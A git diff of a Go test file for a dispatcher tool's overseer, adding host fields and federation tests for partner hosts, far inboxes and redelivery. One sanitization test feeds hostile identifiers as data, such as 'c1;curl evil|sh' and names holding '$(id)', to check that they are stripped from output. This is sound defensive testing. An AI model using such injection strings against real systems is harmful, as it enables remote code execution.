@@ -12,6 +12,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"reflect"
+	"slices"
 	"strings"
 	"sync/atomic"
 	"syscall"
@@ -20,6 +21,7 @@ import (
 
 	"github.com/noamsto/dispatcher/crew/internal/clock"
 	fleetpkg "github.com/noamsto/dispatcher/crew/internal/fleet"
+	"github.com/noamsto/dispatcher/crew/internal/fleet/fleettest"
 	lanepkg "github.com/noamsto/dispatcher/crew/internal/lane"
 	"github.com/noamsto/dispatcher/crew/internal/proc"
 	"github.com/noamsto/dispatcher/crew/internal/repos"
@@ -198,7 +200,7 @@ func TestOverseerReportsMisroutedSenderNeverBody(t *testing.T) {
 	if len(lines) != 1 {
 		t.Fatalf("misrouted lines = %v, want one", lines)
 	}
-	want := map[string]any{"stream": "overseer", "event": "misrouted_msg", "repo": "alpha", "crew": "c1",
+	want := map[string]any{"stream": "overseer", "event": "misrouted_msg", "repo": "alpha", "crew": "c1", "host": ovHost,
 		"from": "worker:feat/a#s1-1", "misrouted": float64(1), "ts": float64(ovStart)}
 	if !reflect.DeepEqual(lines[0], want) {
 		t.Errorf("misrouted line = %v, want %v", lines[0], want)
@@ -473,13 +475,15 @@ func TestOverseerStopsOnTermDuringAHungStatusRead(t *testing.T) {
 // ovStart, and collect is its status read.
 func bareOverseer(out io.Writer, collect func(context.Context, io.Writer) fleetpkg.StatusDoc) *overseer {
 	return &overseer{
-		c:       call{crew: ovMe, heartbeat: defaultHeartbeat},
-		o:       FleetOptions{Options: Options{Clock: clock.Clock{Now: newMSClock(ovStart).Now}}},
-		out:     &laneWriter{w: out, now: time.Now},
-		notes:   newNotes(io.Discard),
-		sup:     &suppress{key: map[string]string{}, ts: map[string]int64{}},
-		moves:   newTransitions(),
-		collect: collect,
+		c:        call{crew: ovMe, heartbeat: defaultHeartbeat},
+		o:        FleetOptions{Options: Options{Clock: clock.Clock{Now: newMSClock(ovStart).Now}}},
+		out:      &laneWriter{w: out, now: time.Now},
+		notes:    newNotes(io.Discard),
+		sup:      &suppress{key: map[string]string{}, ts: map[string]int64{}},
+		moves:    newTransitions(),
+		partners: map[string]*partner{},
+		inboxes:  map[string]lanepkg.FarInbox{},
+		collect:  collect,
 	}
 }
 
@@ -642,7 +646,7 @@ func TestOverseerLaneDiffsInjectedStatusEveryInterval(t *testing.T) {
 	l.kick()
 	l.stop()
 	got := ofEvent(l.lines(), "dispatcher_down")
-	want := map[string]any{"stream": "overseer", "event": "dispatcher_down", "repo": "o/alpha", "crew": "c1",
+	want := map[string]any{"stream": "overseer", "event": "dispatcher_down", "repo": "o/alpha", "crew": "c1", "host": ovHost,
 		"state": "dead", "ts": float64(ovStart + minute)}
 	if len(got) != 1 || !reflect.DeepEqual(got[0], want) {
 		t.Errorf("dispatcher_down lines = %v, want [%v]", got, want)
@@ -766,7 +770,7 @@ func ovDoc(ts int64, rs ...fleetpkg.RepoStatus) fleetpkg.StatusDoc {
 }
 
 func ovRepo(name string, crews ...fleetpkg.CrewStatus) fleetpkg.RepoStatus {
-	return fleetpkg.RepoStatus{Repo: "o/" + name, Common: "/git/" + name + "/.git", Crews: crews}
+	return fleetpkg.RepoStatus{Repo: "o/" + name, Common: "/git/" + name + "/.git", Key: "/git/" + name + "/.git", Crews: crews}
 }
 
 func ovCrew(id, state, attention string, workers ...map[string]any) fleetpkg.CrewStatus {
@@ -870,7 +874,7 @@ func TestTransitionsDispatcherDown(t *testing.T) {
 	tr := newTransitions()
 	step(t, tr, ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w))))
 	got := step(t, tr, ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w))))
-	want := []map[string]any{{"stream": "overseer", "event": "dispatcher_down", "repo": "o/alpha", "crew": "c1",
+	want := []map[string]any{{"stream": "overseer", "event": "dispatcher_down", "repo": "o/alpha", "crew": "c1", "host": ovHost,
 		"state": "dead", "ts": float64(ovStart + minute + 1)}}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("live → dead = %v, want %v", got, want)
@@ -928,8 +932,8 @@ func TestTransitionsDispatcherUpOnlyAfterDown(t *testing.T) {
 		names = append(names, n)
 	}
 	wantSteps(t, names, none(), evs("dispatcher_down c1"), evs("dispatcher_up c1"), none(), evs("dispatcher_down c1"), evs("dispatcher_up c1"))
-	if up := got[2][0]; up["repo"] != "o/alpha" || len(up) != 5 {
-		t.Errorf("dispatcher_up line = %v, want stream, event, repo, crew and ts", up)
+	if up := got[2][0]; up["repo"] != "o/alpha" || up["host"] != ovHost || len(up) != 6 {
+		t.Errorf("dispatcher_up line = %v, want stream, event, repo, crew, host and ts", up)
 	}
 }
 
@@ -984,7 +988,7 @@ func TestTransitionsBlockedAgingByAgeThenBudget(t *testing.T) {
 		if t.Failed() {
 			continue
 		}
-		age := map[string]any{"stream": "overseer", "event": "blocked_aging", "repo": "o/alpha", "crew": "c1",
+		age := map[string]any{"stream": "overseer", "event": "blocked_aging", "repo": "o/alpha", "crew": "c1", "host": ovHost,
 			"session": "worker:feat/a#s1-1", "branch": "feat/a", "trigger": "age", "since": float64(ovStart),
 			"budget_left_s": nil, "ts": float64(ovStart + 30*minute + 1)}
 		if !reflect.DeepEqual(lines[2][0], age) {
@@ -1022,7 +1026,7 @@ func TestTransitionsAbandoned(t *testing.T) {
 	tr := newTransitions()
 	step(t, tr, at(0, ovWorker("worker:feat/a#s1-1", "working")))
 	got := step(t, tr, at(1, failed("blocked, no dispatcher reply")))
-	want := []map[string]any{{"stream": "overseer", "event": "abandoned", "repo": "o/alpha", "crew": "c1",
+	want := []map[string]any{{"stream": "overseer", "event": "abandoned", "repo": "o/alpha", "crew": "c1", "host": ovHost,
 		"session": "worker:feat/a#s1-1", "branch": "feat/a", "ts": float64(ovStart + minute + 1)}}
 	if !reflect.DeepEqual(got, want) {
 		t.Errorf("abandoned = %v, want %v", got, want)
@@ -1087,6 +1091,25 @@ func TestTransitionsFilterRepoAndQueueText(t *testing.T) {
 	got = step(t, tr, withQueue(ovDoc(ovStart+minute), q, 10, 5))
 	if len(got) != 1 || got[0]["repo"] != clean || got[0]["crew"] != "c?1" || got[0]["hold"] != "h?1" {
 		t.Errorf("capacity_stuck = %v, want repo %q crew c?1 hold h?1", got, clean)
+	}
+}
+
+func TestTransitionsKeyFarRepos(t *testing.T) {
+	far := func(name string, c fleetpkg.CrewStatus) fleetpkg.RepoStatus {
+		return fleetpkg.RepoStatus{Repo: "o/" + name, Key: "/far/" + name + "/.git", Crews: []fleetpkg.CrewStatus{c}}
+	}
+	live := func(name string) fleetpkg.RepoStatus { return far(name, ovCrew("c1", "live", "attended")) }
+	down := func(name string) fleetpkg.RepoStatus { return far(name, ovCrew("c1", "dead", "unattended")) }
+	tr := newTransitions()
+	step(t, tr, ovDoc(ovStart, live("a"), live("b")))
+	if got := step(t, tr, ovDoc(ovStart+minute, down("a"), down("b"))); len(got) != 2 {
+		t.Errorf("dispatcher_down lines = %v, want one per far repo", got)
+	}
+	if got := step(t, tr, ovDoc(ovStart+2*minute, down("a"))); len(got) != 0 {
+		t.Errorf("an absent far repo re-fired: %v", got)
+	}
+	if got := step(t, tr, ovDoc(ovStart+3*minute, down("a"), down("b"))); len(got) != 0 {
+		t.Errorf("a carried-forward far key re-fired: %v", got)
 	}
 }
 
@@ -1281,5 +1304,596 @@ func TestTransitionsNeverWakeOnRawStatusRows(t *testing.T) {
 		if len(lines) != 0 {
 			t.Errorf("document %d woke %v", i, lines)
 		}
+	}
+}
+
+// Federation: a partner's view arrives as doc.Hosts, folded per host.
+
+func p64(n int64) *int64 { return &n }
+
+func okHost(name string, ts int64, rs ...fleetpkg.RepoStatus) fleetpkg.HostStatus {
+	return fleetpkg.HostStatus{Host: name, State: "ok", TS: p64(ts), LastOkTS: p64(ts), Repos: rs}
+}
+
+func downHost(name string, lastOK int64, errText string) fleetpkg.HostStatus {
+	return fleetpkg.HostStatus{Host: name, State: "unreachable", LastOkTS: p64(lastOK), Error: &errText}
+}
+
+func withHosts(d fleetpkg.StatusDoc, hs ...fleetpkg.HostStatus) fleetpkg.StatusDoc {
+	d.Hosts = hs
+	return d
+}
+
+// fedRun diffs each doc in turn through a bare overseer and returns the lines
+// printed after each one.
+func fedRun(t *testing.T, v *overseer, docs ...fleetpkg.StatusDoc) [][]map[string]any {
+	t.Helper()
+	var out lockedWriter
+	v.out = &laneWriter{w: &out, now: time.Now}
+	i := 0
+	v.collect = func(context.Context, io.Writer) fleetpkg.StatusDoc { i++; return docs[i-1] }
+	v.interval = time.Minute
+	var got [][]map[string]any
+	seen := 0
+	for range docs {
+		v.diff(t.Context())
+		all := decodeLinesT(t, out.str())
+		got = append(got, all[seen:])
+		seen = len(all)
+	}
+	return got
+}
+
+func fedOverseer(t *testing.T) *overseer {
+	t.Helper()
+	v := bareOverseer(io.Discard, nil)
+	v.host, v.stateDir, v.start, v.timeout = ovHost, t.TempDir(), ovStart, time.Minute
+	return v
+}
+
+func stubBatches(t *testing.T, batches map[string][]fleetpkg.FarBatch, mis map[string][]fleetpkg.FarMisrouted) {
+	t.Helper()
+	old := hostBatches
+	t.Cleanup(func() { hostBatches = old })
+	hostBatches = func(h fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		return batches[h.Host], mis[h.Host]
+	}
+}
+
+// farInbox is the lane's inbox for mbp.
+func farInbox(t *testing.T, stateDir string) lanepkg.FarInbox {
+	t.Helper()
+	in, ok := lanepkg.ReadFarInbox(lanepkg.OverseerHostInbox(stateDir, "mbp"))
+	if !ok {
+		t.Fatal("no inbox for mbp")
+	}
+	return in
+}
+
+func TestOverseerLinesCarryHost(t *testing.T) {
+	w := ovWorker("worker:feat/a#s1-1", "working")
+	got := fedRun(t, fedOverseer(t),
+		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w))),
+		withQueue(ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w))),
+			fleetpkg.QueueStatus{Demoted: []fleetpkg.QueueDemote{{Repo: "o/alpha", CrewID: "c1", ID: "h1"}}}, 0, 0))
+	if len(got[1]) != 2 {
+		t.Fatalf("lines = %v, want dispatcher_down and capacity_stuck", got[1])
+	}
+	for _, l := range got[1] {
+		if l["host"] != ovHost {
+			t.Errorf("line %v: host = %v, want %q", l, l["host"], ovHost)
+		}
+	}
+}
+
+func TestOverseerPartnerDispatcherDownCarriesHost(t *testing.T) {
+	w := ovWorker("worker:feat/a#s1-1", "working")
+	up := okHost("mbp", ovStart, ovRepo("beta", ovCrew("c9", "live", "attended", w)))
+	down := okHost("mbp", ovStart+minute, ovRepo("beta", ovCrew("c9", "dead", "unattended", w)))
+	got := fedRun(t, fedOverseer(t),
+		withHosts(ovDoc(ovStart), up), withHosts(ovDoc(ovStart+minute), down), withHosts(ovDoc(ovStart+2*minute), down))
+	if len(got[0]) != 0 || len(got[2]) != 0 {
+		t.Errorf("baseline %v / repeat %v printed lines, want none", got[0], got[2])
+	}
+	if len(got[1]) != 1 || got[1][0]["event"] != "dispatcher_down" || got[1][0]["host"] != "mbp" || got[1][0]["crew"] != "c9" {
+		t.Errorf("lines = %v, want one dispatcher_down host mbp", got[1])
+	}
+}
+
+func TestOverseerGuestCrewFiresOnlyWorkerConditions(t *testing.T) {
+	blocked := blockedWorker("worker:feat/g#s1-1", ovStart, nil, "agent", false)
+	guest := func(ts int64, state, lane string) fleetpkg.HostStatus {
+		return okHost("mbp", ts, ovRepo("beta", withLane(ovCrew("g1", state, "guest", blocked), lane)))
+	}
+	got := fedRun(t, fedOverseer(t),
+		withHosts(ovDoc(ovStart), guest(ovStart, "live", "alive")),
+		withHosts(ovDoc(ovStart+minute), guest(ovStart+minute, "dead", "dead")),
+		withHosts(ovDoc(ovStart+40*minute), guest(ovStart+40*minute, "live", "dead")))
+	for _, step := range got {
+		for _, l := range step {
+			if l["event"] == "dispatcher_down" || l["event"] == "lane_dead" {
+				t.Errorf("guest crew fired %v", l)
+			}
+		}
+	}
+	aging := ofEvent(slices.Concat(got...), "blocked_aging")
+	if len(aging) != 1 || aging[0]["host"] != "mbp" {
+		t.Errorf("blocked_aging lines = %v, want one with host mbp", aging)
+	}
+}
+
+func TestOverseerHomeCrewRemoteRowFiresNoWorkerEvent(t *testing.T) {
+	remote := blockedWorker("worker:feat/r#s1-1", ovStart, nil, "agent", false)
+	remote["host"] = "mbp"
+	failed := ovWorker("worker:feat/f#s1-1", "failed")
+	failed["detail"] = "blocked, no dispatcher reply"
+	failed["host"] = "mbp"
+	got := fedRun(t, fedOverseer(t),
+		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended"))),
+		ovDoc(ovStart+40*minute, ovRepo("alpha", ovCrew("c1", "live", "attended", remote, failed))))
+	if len(got[1]) != 0 {
+		t.Errorf("remote rows fired %v, want none", got[1])
+	}
+}
+
+func TestOverseerHostUnreachableThenReachable(t *testing.T) {
+	w := ovWorker("worker:feat/a#s1-1", "working")
+	good := func(ts int64) fleetpkg.HostStatus {
+		return okHost("mbp", ts, ovRepo("beta", ovCrew("c9", "dead", "unattended", w)))
+	}
+	got := fedRun(t, fedOverseer(t),
+		withHosts(ovDoc(ovStart), good(ovStart)),
+		withHosts(ovDoc(ovStart+minute), downHost("mbp", ovStart, "ssh: timeout")),
+		withHosts(ovDoc(ovStart+2*minute), downHost("mbp", ovStart, "ssh: timeout")),
+		withHosts(ovDoc(ovStart+3*minute), good(ovStart+3*minute)))
+	if len(got[0]) != 0 || len(got[2]) != 0 {
+		t.Errorf("baseline %v / repeat-down %v printed lines", got[0], got[2])
+	}
+	want := map[string]any{"stream": "overseer", "event": "host_unreachable", "repo": "", "crew": "", "host": "mbp",
+		"error": "ssh: timeout", "last_ok_ts": float64(ovStart), "ts": float64(ovStart)}
+	if len(got[1]) != 1 || !reflect.DeepEqual(got[1][0], want) {
+		t.Errorf("down lines = %v, want [%v]", got[1], want)
+	}
+	if len(got[3]) != 1 || got[3][0]["event"] != "host_reachable" || got[3][0]["host"] != "mbp" {
+		t.Errorf("recovery lines = %v, want only host_reachable (dispatcher_down was carried)", got[3])
+	}
+}
+
+func TestOverseerHostFirstSeenUnreachableIsBaseline(t *testing.T) {
+	got := fedRun(t, fedOverseer(t),
+		withHosts(ovDoc(ovStart), downHost("mbp", ovStart-minute, "x")),
+		withHosts(ovDoc(ovStart+minute), downHost("mbp", ovStart-minute, "x")))
+	if len(got[0])+len(got[1]) != 0 {
+		t.Errorf("lines = %v, want none", got)
+	}
+}
+
+func TestOverseerRemoteBatchPrintedOnceAndKeptInTheInbox(t *testing.T) {
+	v := fedOverseer(t)
+	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg", "body": "hi"} }
+	stubBatches(t,
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 20, Events: []map[string]any{ev(ovStart - 5), ev(ovStart + 10), ev(ovStart + 20)}}}},
+		nil)
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	got := fedRun(t, v, doc(ovStart), doc(ovStart+minute))
+	if len(got[0]) != 1 || len(got[1]) != 0 {
+		t.Fatalf("lines = %v, want the batch once", got)
+	}
+	b := got[0][0]
+	events, _ := b["events"].([]any)
+	if b["host"] != "mbp" || b["repo"] != "o/beta" || b["cursor"] != float64(ovStart+20) || len(events) != 2 {
+		t.Errorf("batch = %v, want host mbp repo o/beta cursor %d and the two events above the start", b, ovStart+20)
+	}
+	if in := farInbox(t, v.stateDir); in.Floor != ovStart || len(in.Seen) != 2 {
+		t.Errorf("inbox = %+v, want floor %d and the two printed keys", in, ovStart)
+	}
+}
+
+func TestOverseerRemoteInboxStartsAtTheLaneStart(t *testing.T) {
+	v := fedOverseer(t)
+	stubBatches(t, nil, nil)
+	fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
+	if in := farInbox(t, v.stateDir); in.Floor != ovStart || in.Seen == nil || len(in.Seen) != 0 {
+		t.Errorf("inbox = %+v, want floor at the lane start %d and no keys", in, ovStart)
+	}
+}
+
+func TestOverseerRemoteBatchRedeliveredWhenFlushFails(t *testing.T) {
+	v := fedOverseer(t)
+	v.o.Flush = func() error { return errors.New("pipe") }
+	stubBatches(t,
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10)}}}}},
+		nil)
+	fedRun(t, v, withHosts(ovDoc(ovStart+10*minute), okHost("mbp", ovStart+10*minute)))
+	if in := farInbox(t, v.stateDir); in.Floor != ovStart || len(in.Seen) != 0 {
+		t.Errorf("inbox = %+v, want floor %d and no keys: the batch never reached the wire", in, ovStart)
+	}
+}
+
+func TestOverseerRemoteMisroutedCarriesHostAndSenderOnly(t *testing.T) {
+	v := fedOverseer(t)
+	stubBatches(t, nil,
+		map[string][]fleetpkg.FarMisrouted{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", CrewID: "c9", From: "worker:feat/x#s1", TS: ovStart + 5}, {Repo: "o/beta", Common: "/git/beta/.git", CrewID: "c9", From: "worker:feat/y#s1", TS: ovStart + 6}}})
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	got := fedRun(t, v, doc(ovStart), doc(ovStart+minute))
+	m := ofEvent(slices.Concat(got...), "misrouted_msg")
+	if len(m) != 1 || m[0]["host"] != "mbp" || m[0]["from"] != "worker:feat/x#s1" || m[0]["repo"] != "" || m[0]["crew"] != "" || m[0]["misrouted"] != float64(2) {
+		t.Errorf("misrouted lines = %v, want one for host mbp from the first sender", m)
+	}
+	if in := farInbox(t, v.stateDir); len(in.Seen) != 2 {
+		t.Errorf("inbox = %+v, want both misrouted keys", in)
+	}
+}
+
+func TestOverseerRemoteInboxFloorFollowsTheFarClock(t *testing.T) {
+	v := fedOverseer(t)
+	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg"} }
+	pulls := [][]fleetpkg.FarBatch{
+		{{Repo: "o/a", Common: "/git/a/.git", Cursor: ovStart + 1, Events: []map[string]any{ev(ovStart + 1)}}},
+		nil,
+	}
+	old := hostBatches
+	t.Cleanup(func() { hostBatches = old })
+	n := 0
+	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		n++
+		return pulls[n-1], nil
+	}
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	fedRun(t, v, doc(ovStart+minute), doc(ovStart+10*minute))
+	if in := farInbox(t, v.stateDir); in.Floor != ovStart+9*minute || len(in.Seen) != 0 {
+		t.Errorf("inbox = %+v, want floor %d, the far ts less farSettle, and the key below it pruned", in, ovStart+9*minute)
+	}
+}
+
+// An inbox the lane cannot write is an error line, not a replay: the lane
+// keeps what it delivered in memory, so each pull prints only what it has not.
+func TestOverseerRemoteInboxWriteFailureDoesNotReprint(t *testing.T) {
+	v := fedOverseer(t)
+	path := lanepkg.OverseerHostInbox(v.stateDir, "mbp")
+	if err := lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}); err != nil {
+		t.Fatal(err)
+	}
+	dir := filepath.Dir(path)
+	if err := os.Chmod(dir, 0o555); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
+	if lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}) == nil {
+		t.Skip("a read-only dir is writable here")
+	}
+	ev := func(ts int64, body string) map[string]any {
+		return map[string]any{"ts": float64(ts), "kind": "msg", "body": body}
+	}
+	a1, b1 := ev(ovStart+10, "a1"), ev(ovStart+20, "b1")
+	pulls := [][]map[string]any{{a1}, {a1}, {a1, b1}, {a1, b1}}
+	old := hostBatches
+	t.Cleanup(func() { hostBatches = old })
+	n := 0
+	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		n++
+		return []fleetpkg.FarBatch{{Repo: "o/a", Common: "/git/a/.git", Cursor: ovStart + 20, Events: pulls[n-1]}}, nil
+	}
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	got := fedRun(t, v, doc(ovStart), doc(ovStart+1000), doc(ovStart+2000), doc(ovStart+3000))
+	want := [][]string{{"a1"}, nil, {"b1"}, nil}
+	for i, lines := range got {
+		if bodies := farBodies(lines); !slices.Equal(bodies, want[i]) {
+			t.Errorf("pull %d printed %q, want %q", i+1, bodies, want[i])
+		}
+	}
+	var errs []any
+	for _, l := range slices.Concat(got...) {
+		if l["stream"] == "error" {
+			errs = append(errs, l["detail"])
+		}
+	}
+	if len(errs) == 0 || !strings.HasPrefix(fmt.Sprint(errs[0]), "inbox: ") {
+		t.Errorf("error details = %v, want the inbox write failure", errs)
+	}
+}
+
+func TestOverseerLinesSanitizeFarIdentifiers(t *testing.T) {
+	const evil = "c1;curl evil|sh"
+	abandoned := ovWorker("worker:feat/$(id)#s1", "failed")
+	abandoned["detail"] = "blocked, no dispatcher reply"
+	host := func(ts int64, state, attention string, ws ...map[string]any) fleetpkg.HostStatus {
+		r := ovRepo("beta", ovCrew(evil, state, attention, ws...))
+		r.Repo = "a/b$(id)"
+		return okHost("mbp", ts, r)
+	}
+	stubBatches(t,
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "a/b$(id)", Common: "/git/beta/.git", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10), "kind": "msg"}}}}},
+		nil)
+	got := fedRun(t, fedOverseer(t),
+		withHosts(ovDoc(ovStart), host(ovStart, "live", "attended")),
+		withHosts(ovDoc(ovStart+minute), host(ovStart+minute, "dead `x`", "unattended", abandoned)))
+	lines := slices.Concat(got...)
+	if len(ofEvent(lines, "dispatcher_down")) != 1 || len(ofEvent(lines, "abandoned")) != 1 {
+		t.Fatalf("lines = %v, want dispatcher_down and abandoned", lines)
+	}
+	for _, l := range lines {
+		raw, err := json.Marshal(l)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if i := bytes.IndexAny(raw, "$(;` |"); i >= 0 {
+			t.Errorf("%q reached a lane line: %s", raw[i], raw)
+		}
+	}
+}
+
+func TestOverseerRemoteReplyTSInFloatForm(t *testing.T) {
+	v := fedOverseer(t)
+	stubBatches(t,
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 20, Events: []map[string]any{
+			{"ts": json.Number("1800000000010.0"), "kind": "msg"},
+			{"ts": json.Number("1.80000000002e12"), "kind": "msg"},
+		}}}},
+		nil)
+	got := fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
+	if len(got[0]) != 1 {
+		t.Fatalf("lines = %v, want the batch", got[0])
+	}
+	if events, _ := got[0][0]["events"].([]any); len(events) != 2 {
+		t.Errorf("events = %v, want both replies above the cursor", got[0][0]["events"])
+	}
+}
+
+// farRig is the overseer lane of ovHost with mbp its one partner, end to end:
+// the lane's status read is the real overseer-mode collection, which pulls mbp
+// through ServeFar over a far fleet.
+type farRig struct {
+	far   *fleettest.Far
+	state string
+	clock *msClock
+	opts  fleetpkg.StatusOptions
+	flush func() error
+}
+
+func newFarRig(t *testing.T) *farRig {
+	t.Helper()
+	r := &farRig{far: fleettest.NewFar(t, "mbp", ovStart+minute), state: t.TempDir(), clock: newMSClock(ovStart + minute)}
+	r.opts = fleettest.Overseer(t, ovHost, r.state, r.clock.Now, r.far.Serve(), "mbp")
+	return r
+}
+
+// lane is a fresh overseer lane started at ovStart over the rig's state.
+func (r *farRig) lane(t *testing.T) *overseer {
+	t.Helper()
+	v := bareOverseer(io.Discard, func(ctx context.Context, w io.Writer) fleetpkg.StatusDoc {
+		doc := fleetpkg.CollectStatus(ctx, fleetpkg.StatusRequest{}, w, r.opts)
+		if len(doc.Hosts) != 1 || doc.Hosts[0].State != "ok" {
+			t.Fatalf("hosts = %+v, want mbp ok", doc.Hosts)
+		}
+		return doc
+	})
+	v.host, v.stateDir, v.start, v.timeout, v.interval = ovHost, r.state, ovStart, time.Minute, time.Minute
+	v.o.Flush = func() error {
+		if r.flush != nil {
+			return r.flush()
+		}
+		return nil
+	}
+	return v
+}
+
+// pull is one status read of v: the bodies of the far replies it printed.
+func (r *farRig) pull(t *testing.T, v *overseer) []string {
+	t.Helper()
+	var out lockedWriter
+	v.out = &laneWriter{w: &out, now: time.Now}
+	v.diff(t.Context())
+	return farBodies(decodeLinesT(t, out.str()))
+}
+
+// farBodies are the bodies of the far replies among lines.
+func farBodies(lines []map[string]any) []string {
+	var bodies []string
+	for _, l := range lines {
+		events, _ := l["events"].([]any)
+		for _, e := range events {
+			ev, _ := e.(map[string]any)
+			body, _ := ev["body"].(string)
+			bodies = append(bodies, body)
+		}
+	}
+	return bodies
+}
+
+// A far reply stamped while a pull ran, but on its bus only after that pull
+// folded it, is in the next pull: neither the oldest nor the newest far
+// cursor may hold back --since past it. Each reply is printed once, and a new
+// lane over the same state replays none.
+func TestOverseerRemoteReplyLandingMidPullIsDelivered(t *testing.T) {
+	for _, tc := range []struct {
+		name    string
+		aActive bool
+	}{
+		{name: "A quiet in pull 1", aActive: true},
+		{name: "only B active in pull 1, as one max cursor sees it"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			r := newFarRig(t)
+			if tc.aActive {
+				r.far.Repo("a")
+			} else {
+				r.far.Register("a")
+			}
+			r.far.Repo("b")
+			now := r.far.Now()
+			r.far.Append("b", fleettest.Reply(now-10_000, "c2", ovHost, "b1"))
+			v := r.lane(t)
+			var all []string
+			check := func(n int, want ...string) {
+				t.Helper()
+				got := r.pull(t, v)
+				all = append(all, got...)
+				if !slices.Equal(got, want) {
+					t.Errorf("pull %d printed %q, want %q", n, got, want)
+				}
+			}
+			check(1, "b1")
+			r.far.Append("a", fleettest.Reply(now-20_000, "c1", ovHost, "a1"))
+			check(2, "a1")
+			r.far.Advance(2 * time.Minute)
+			r.clock.advance(2 * time.Minute)
+			check(3)
+			v = r.lane(t)
+			check(4)
+			slices.Sort(all)
+			if !slices.Equal(all, []string{"a1", "b1"}) {
+				t.Errorf("printed %q overall, want each reply once", all)
+			}
+		})
+	}
+}
+
+// A pull whose batch misses the wire leaves the inbox as it was, so the next
+// pull prints that batch again.
+func TestOverseerRemoteRedeliversAfterFailedFlush(t *testing.T) {
+	r := newFarRig(t)
+	r.far.Repo("a")
+	r.far.Repo("b")
+	now := r.far.Now()
+	r.far.Append("b", fleettest.Reply(now-10_000, "c2", ovHost, "b1"))
+	v := r.lane(t)
+	if got := r.pull(t, v); !slices.Equal(got, []string{"b1"}) {
+		t.Fatalf("pull 1 printed %q, want b1", got)
+	}
+	path := lanepkg.OverseerHostInbox(r.state, "mbp")
+	before := readFile(path)
+	r.far.Append("a", fleettest.Reply(now-5_000, "c1", ovHost, "a1"))
+	r.flush = func() error { return errors.New("pipe") }
+	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
+		t.Fatalf("pull 2 printed %q, want a1 written before its flush failed", got)
+	}
+	if after := readFile(path); after != before {
+		t.Errorf("inbox after a failed flush = %q, want it unchanged %q", after, before)
+	}
+	r.flush = nil
+	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
+		t.Errorf("pull 3 printed %q, want a1 again", got)
+	}
+	if got := r.pull(t, v); len(got) != 0 {
+		t.Errorf("pull 4 printed %q, want nothing", got)
+	}
+}
+
+// An inbox file the lane can no longer write holds --since below the lane's
+// floor; the older replies that pull brings back are not printed again.
+func TestOverseerRemoteStaleInboxFileReplaysNothing(t *testing.T) {
+	r := newFarRig(t)
+	r.far.Repo("a")
+	r.far.Append("a", fleettest.Reply(r.far.Now()-10_000, "c1", ovHost, "a1"))
+	v := r.lane(t)
+	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
+		t.Fatalf("pull 1 printed %q, want a1", got)
+	}
+	path := lanepkg.OverseerHostInbox(r.state, "mbp")
+	dir := filepath.Dir(path)
+	if err := os.Chmod(dir, 0o555); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
+	if lanepkg.WriteFarInbox(path, farInbox(t, r.state)) == nil {
+		t.Skip("a read-only dir is writable here")
+	}
+	advance := func() {
+		r.far.Advance(2 * time.Minute)
+		r.clock.advance(2 * time.Minute)
+	}
+	advance()
+	r.far.Append("a", fleettest.Reply(r.far.Now()-5_000, "c1", ovHost, "b1"))
+	if got := r.pull(t, v); !slices.Equal(got, []string{"b1"}) {
+		t.Errorf("pull 2 printed %q, want b1", got)
+	}
+	advance()
+	if got := r.pull(t, v); len(got) != 0 {
+		t.Errorf("pull 3 printed %q, want nothing", got)
+	}
+}
+
+// A partner's first sight seeds its inbox at the lane's start before any
+// flush, so the pull after it asks from there, not from the fallback window,
+// even when the first batch missed the wire.
+func TestOverseerRemoteSeedsPartnerInboxAtTheLaneStart(t *testing.T) {
+	r := newFarRig(t)
+	r.far.Repo("a")
+	r.far.Append("a", fleettest.Reply(r.far.Now()-10_000, "c1", ovHost, "a1"))
+	serve := r.far.Serve()
+	var sinces []string
+	r.opts.Federate = func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
+		sinces = append(sinces, argv[len(argv)-1])
+		return serve(ctx, host, argv, stdout, stderr)
+	}
+	v := r.lane(t)
+	r.flush = func() error { return errors.New("pipe") }
+	r.pull(t, v)
